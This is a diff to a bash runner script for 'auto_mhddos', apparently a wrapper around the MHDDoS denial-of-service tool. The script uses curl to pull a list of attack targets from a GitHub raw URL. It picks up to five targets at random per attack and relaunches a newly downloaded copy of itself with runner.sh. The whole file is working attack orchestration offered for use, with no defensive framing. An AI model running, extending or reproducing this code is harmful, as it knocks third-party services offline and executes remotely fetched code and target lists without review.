@@ -54,17 +54,18 @@ do
    	echo "$num"
    	
    	if ((num == 1));
-   	then
+   	then	
+		clear
 		echo -e "Running up to date auto_mhddos"
 	else
 		cd ~/auto_mhddos_test
 		clear
 		echo "Running updated auto_mhddos"
 		echo -e "\033[0;31m\n\ndebug in else in while: $debug\n\n\033[0;0m"
-		bash runner.sh $num_of_copies $threads $rpc $debug&
-		exit
+		bash runner.sh $num_of_copies $threads $rpc $debug& # run new downloaded script 
+		exit #terminate old script
 	fi
-	#clear
+	#
    	
 	
 	echo -e "\n\ndebug: $debug\n\n"
@@ -73,14 +74,24 @@ do
    	list_size=$(curl -s https://raw.githubusercontent.com/alexnest-ua/auto_mhddos_test/main/runner_targets | cat | grep "^[^#]" | wc -l)
 	
 	echo -e "\nNumber of targets in list: " $list_size "\n"
-   	echo -e "\nTaking random targets to reduce the load on your CPU(processor)..."
+   	echo -e "\nTaking random targets (just not all) to reduce the load on your CPU(processor)..."
 	
    	if (("$num_of_copies" == "all"));
-	then
-		random_numbers=$(shuf -i 1-$list_size -n $list_size)
+	then	
+		if ((list_size > 5)); # takes not more than 5 targets to one attack (to deffend your machine)
+		then
+			random_numbers=$(shuf -i 1-$list_size -n 5)
+		else
+			random_numbers=$(shuf -i 1-$list_size -n $list_size)
+		fi
 	elif ((num_of_copies > list_size));
 	then 
-		random_numbers=$(shuf -i 1-$list_size -n $list_size)
+		if ((list_size > 5)); # takes not more than 5 targets to one attack (to deffend your machine)
+		then
+			random_numbers=$(shuf -i 1-$list_size -n 5)
+		else
+			random_numbers=$(shuf -i 1-$list_size -n $list_size)
+		fi
 	elif ((num_of_copies < 1));
 	then
 		num_of_copies=1
